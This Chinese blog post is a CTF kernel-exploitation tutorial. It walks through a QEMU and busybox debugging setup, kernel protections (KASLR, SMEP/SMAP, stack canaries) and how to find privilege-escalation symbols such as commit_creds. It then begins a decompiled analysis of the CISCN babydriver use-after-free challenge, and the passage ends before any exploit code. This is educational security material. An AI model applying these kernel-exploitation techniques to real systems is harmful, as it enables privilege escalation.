<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="Kernel Pwn从入门到放弃前言自从上次简单地学了一下kernel之后已经很久没碰了，再捡起来发现还是蛮费劲的，还是写篇博客记录一下环境的搭建，本篇主要参考17、p4nda师兄和x3h1n师姐的博客，中间查了些别的资料，汇总成一篇大杂烩供自己翻阅hh 环境搭建调试kernel有几种方式，真实漏洞环境大多用Vmware双机调试，或者kvm/qemu，这里介绍CTF里最常用到的qemu方式搭建ke">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel Pwn从入门到放弃">
<meta property="og:url" content="http://ama2in9.top/2020/09/03/kernel/index.html">
<meta property="og:site_name" content="Ama2in9">
<meta property="og:description" content="Kernel Pwn从入门到放弃前言自从上次简单地学了一下kernel之后已经很久没碰了，再捡起来发现还是蛮费劲的，还是写篇博客记录一下环境的搭建，本篇主要参考17、p4nda师兄和x3h1n师姐的博客，中间查了些别的资料，汇总成一篇大杂烩供自己翻阅hh 环境搭建调试kernel有几种方式，真实漏洞环境大多用Vmware双机调试，或者kvm/qemu，这里介绍CTF里最常用到的qemu方式搭建ke">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://ama2in9.top/2020/09/03/kernel/1.png">
<meta property="og:image" content="http://ama2in9.top/2020/09/03/kernel/2.png">
<meta property="og:updated_time" content="2020-03-05T13:54:54.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Kernel Pwn从入门到放弃">
<meta name="twitter:description" content="Kernel Pwn从入门到放弃前言自从上次简单地学了一下kernel之后已经很久没碰了，再捡起来发现还是蛮费劲的，还是写篇博客记录一下环境的搭建，本篇主要参考17、p4nda师兄和x3h1n师姐的博客，中间查了些别的资料，汇总成一篇大杂烩供自己翻阅hh 环境搭建调试kernel有几种方式，真实漏洞环境大多用Vmware双机调试，或者kvm/qemu，这里介绍CTF里最常用到的qemu方式搭建ke">
<meta name="twitter:image" content="http://ama2in9.top/2020/09/03/kernel/1.png">






  <link rel="canonical" href="http://ama2in9.top/2020/09/03/kernel/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Kernel Pwn从入门到放弃 | Ama2in9</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ama2in9</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />Search</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2020/09/03/kernel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ama2in9">
      <meta itemprop="description" content="Seeing how far I have been.">
      <meta itemprop="image" content="/images/head.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ama2in9">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Kernel Pwn从入门到放弃
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-09-03 09:08:53" itemprop="dateCreated datePublished" datetime="2020-09-03T09:08:53+08:00">2020-09-03</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-03-05 21:54:54" itemprop="dateModified" datetime="2020-03-05T21:54:54+08:00">2020-03-05</time>
              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2020/09/03/kernel/#comments" itemprop="discussionUrl">
                
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2020/09/03/kernel/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2020/09/03/kernel/" class="leancloud_visitors" data-flag-title="Kernel Pwn从入门到放弃">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="Kernel-Pwn从入门到放弃"><a href="#Kernel-Pwn从入门到放弃" class="headerlink" title="Kernel Pwn从入门到放弃"></a>Kernel Pwn从入门到放弃</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从上次简单地学了一下kernel之后已经很久没碰了，再捡起来发现还是蛮费劲的，还是写篇博客记录一下环境的搭建，本篇主要参考17、p4nda师兄和x3h1n师姐的博客，中间查了些别的资料，汇总成一篇大杂烩供自己翻阅hh</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>调试kernel有几种方式，真实漏洞环境大多用Vmware双机调试，或者kvm/qemu，这里介绍CTF里最常用到的qemu方式搭建kernel pwn环境。</p>
<h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><ol>
<li>下载指定版本的Linux内核，我是从<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">这里</a>下载的</li>
<li><p>解压源码目录，内核编译前的配置，这里用图像化配置方式<code>make menuconfig</code>，有几个选项要勾选(默认应该都会选中)(要先安装<code>sudo apt-get install libncurses5-dev</code>)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. kernel hacking-&gt;</span><br><span class="line">Kernel debugging</span><br><span class="line">Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers</span><br><span class="line">KGDB</span><br><span class="line">2. save-&gt;exit-&gt;exit</span><br></pre></td></tr></table></figure>
</li>
<li><p>make -j4(编译前可能要安装库<code>sudo apt-get install libssl-dev</code>)(编译低版本的内核需要切换低版本的gcc，方法如下)<br>3.1 <code>sudo apt-get install gcc-4.4</code><br>3.2 <code>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x x</code><br>3.3 <code>sudo update-alternatives --config gcc</code></p>
</li>
<li>make modules_install </li>
<li>make install </li>
</ol>
<p>之后就可以在<code>./arch/x86_64/boot/bzImage</code>下可以找到bzImage文件，从源码根目录可以拿到vmlinux(bzImage是vmlinuz经过gzip压缩的文件，适用于大内核，vmlinux是静态编译的未压缩的内核，可以在其中找ROP)</p>
<h3 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h3><p>启动一个Linux系统除了需要内核外还需要一些必要的命令和文件系统，busybox可以提供这样一个小型的操作系统，可以从<a href="https://busybox.net/downloads/" target="_blank" rel="noopener">官网</a>下载Busybox源码自行编译，这里我选择的是1.30.1，编译前使用<code>make menuconfig</code>将编译选项设置为静态编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make make install</span><br></pre></td></tr></table></figure></p>
<p>将生成的_install 文件夹拷贝到linux kernel 源代码根目录</p>
<h3 id="生成文件系统"><a href="#生成文件系统" class="headerlink" title="生成文件系统"></a>生成文件系统</h3><p>进入_install目录，创建文件夹)(-p为不存在则创建)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir etc</span><br><span class="line">mkdir dev</span><br><span class="line">mkdir mnt</span><br><span class="line">mkdir -p etc/init.d/</span><br><span class="line">mkdir home</span><br><span class="line">mkdir root</span><br><span class="line">touch etc/passwd</span><br><span class="line">touch etc/group</span><br></pre></td></tr></table></figure></p>
<p>创建./etc/init.d/rcS文件(可以看成系统启动的初始化文件)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /proc</span><br><span class="line">mkdir -p /tmp</span><br><span class="line">mkdir -p /sys</span><br><span class="line">mkdir -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev -s</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line">insmod vul.ko</span><br></pre></td></tr></table></figure></p>
<p><code>chmod +x rcS</code><br>创建./etc/fatab文件(用fstab可以自动挂载各种文件系统格式的硬盘、分区、可移动设备和远程设备等)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tmpfs /dev tmpfs defaults 0 0</span><br></pre></td></tr></table></figure></p>
<p>创建etc/inittab文件(在特定情况下执行的命令，如最后一条是关机的时候卸载所有挂载文件系统)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r</span><br></pre></td></tr></table></figure></p>
<p>在dev/创建设备节点(创建两个字符设备)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mknod ./dev/console c 5 1</span><br><span class="line">sudo mknod ./dev/null c 1 3</span><br></pre></td></tr></table></figure></p>
<p>创建文件系统，在_install文件夹中执行<br><code>find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img</code></p>
<h3 id="qemu启动Linux-kernel"><a href="#qemu启动Linux-kernel" class="headerlink" title="qemu启动Linux kernel"></a>qemu启动Linux kernel</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel ./linux-4.4.72/arch/x86_64/boot/bzImage --nographic -initrd ./busybox-1.30.1/initramfs.img -m 256M -append &quot;rdinit=./linuxrc -gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
<h3 id="gdb远程调试"><a href="#gdb远程调试" class="headerlink" title="gdb远程调试"></a>gdb远程调试</h3><p>gdb remote 127.0.0.1:1234即可，注意要先设置arch，<code>set arch i386:x86-64:intel</code>，否则会有g pack too long的报错，</p>
<h3 id="在指定内核中编写驱动程序"><a href="#在指定内核中编写驱动程序" class="headerlink" title="在指定内核中编写驱动程序"></a>在指定内核中编写驱动程序</h3><p>linux内核编译前我们用make menuconfig在源码目录生成了一个配置文件.config，这个配置文件表明了内核编译中的一些设置，比如我编译的4.4.72内核默认开启了栈保护，所以七哥栈溢出例子编译之后会有canary和NX，这个是内核决定的，因此要关闭保护只能重新编译内核和驱动(叹气)(后续：重新编译了一次，内核去掉了所有保护，但是驱动仍然有NX，放弃辽)</p>
<p>流程：建个新的文件夹，Makefile:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">obj-m := sbof.o</span><br><span class="line">ROOTDIR  := /path/to/linux/src</span><br><span class="line">PWD   := $(shell pwd)</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">	$(MAKE) -C $(ROOTDIR) M=$(PWD) modules</span><br><span class="line">	$(CC) --static -o exploit exploit.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	$(MAKE) -C $(ROOTDIR) M=$(PWD) clean</span><br><span class="line">	rm exploit</span><br></pre></td></tr></table></figure>
<p>编译完成之后放到busybox的_install里重新打包，之后就可以调试了</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>gdb进去之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file ./vmlinux</span><br><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure></p>
<p>如果给的文件里只有bzImage可以自己提取，<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">脚本地址</a><br>在qemu中查看加载的程序基址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/modules/sbof/sections/.text</span><br></pre></td></tr></table></figure></p>
<p>在gdb中添加符号文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./sbof.ko 0xffffffc0000000</span><br></pre></td></tr></table></figure></p>
<p>查看commit_creds和prepare_kernel_cred函数的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep commit_creds</span><br><span class="line">cat /proc/kallsyms | grep prepare_kernel_cred</span><br></pre></td></tr></table></figure></p>
<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>/proc文件系统是一个虚拟文件系统，可以在/proc中动态创建虚拟文件，通过对虚拟文件的读写与实现与内核的通信。可以使用以下函数创建虚拟文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第三个参数是文件在/proc中的位置，默认为/proc</span></span><br><span class="line"><span class="function">struct proc_dir_entry *<span class="title">create_proc_entry</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">mode_t</span> mode, struct proc_dir_entry *parent )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct proc_dir_entry *<span class="title">proc_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">umode_t</span> mode, struct proc_dir_entry *parent,<span class="keyword">const</span> struct file_operations *proc_fops)</span></span></span><br></pre></td></tr></table></figure>
<p>kptr_restrict控制/proc/kallsyms是否显示symbols的地址，通常会在init文件中给出限制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure></p>
<p>dmesg_restrict限制非特权用户读取dmesg信息，无法访问内核打印的消息，通常会在init文件中给出限制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure>
<h3 id="kernel-pwn保护机制"><a href="#kernel-pwn保护机制" class="headerlink" title="kernel pwn保护机制"></a>kernel pwn保护机制</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>内核地址随机化，相当于ASLR(并非默认启用，需要在内核命令行中加入kaslr开启)</p>
<h4 id="SMAP-SMEP"><a href="#SMAP-SMEP" class="headerlink" title="SMAP/SMEP"></a>SMAP/SMEP</h4><p>SMAP(Supervisor Mode Access Prevention，管理模式访问保护):<br>禁止内核访问用户空间的数据</p>
<p>SMEP类似于NX，即内核态无法执行shellcode,linux内核从3.0开始支持SMEP，3.7开始支持SMAP。</p>
<h4 id="Stack-Protector"><a href="#Stack-Protector" class="headerlink" title="Stack Protector"></a>Stack Protector</h4><p>在编译内核时设置CONFIG_CC_STACKPROTECTOR选项，即可开启该保护，一般而言开了这个保护再编译驱动会发现有canary。</p>
<h2 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h2><h3 id="CISCN-babydriver"><a href="#CISCN-babydriver" class="headerlink" title="CISCN-babydriver"></a>CISCN-babydriver</h3><h4 id="驱动逻辑"><a href="#驱动逻辑" class="headerlink" title="驱动逻辑"></a>驱动逻辑</h4><p>因为是第一次分析，所以写的详细一点，从_init函数开始，首先用alloc_chrdev_region函数动态分配一个设备号，成功分配的话初始化一个cdev结构体(每个字符设备对应一个结构体)，_class_create注册一个字符设备，创建相应的class，再调用device_create创建对应的设备，注意每个地方失败都会有回滚操作(destroy或者unregister)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">babydriver_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="string">"babydev"</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0L</span>L, babydev_no, <span class="number">0L</span>L, <span class="string">"babydev"</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_exit是设备卸载时候的会调用的，把分配的设备和class等回收。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>open函数的参数有inode和filp，每一个设备都会对应一个inode，而且是共享一个inode，这个不像filp文件指针每次打开一个设备都会创建一个新的文件指针以供操作(内核里的文件指针，跟用户态不一样)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read函数是从内核往用户态读数据，kernel里的文件结构体定义了一组基础接口，允许开发者按照参数的标准实现一套自己的函数，read write open release(close)都是自己实现的，这里的read判断babydev_struct.device_buf不为NULL就将用户输入的第三个参数length长的数据从device_buf拷贝到Buffer里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>write是从用户态拷贝length长的数据到babydev_struct.device_buf里，这里的IDA反汇编优点问题，看asm可以看到copy_from_user的参数</p>
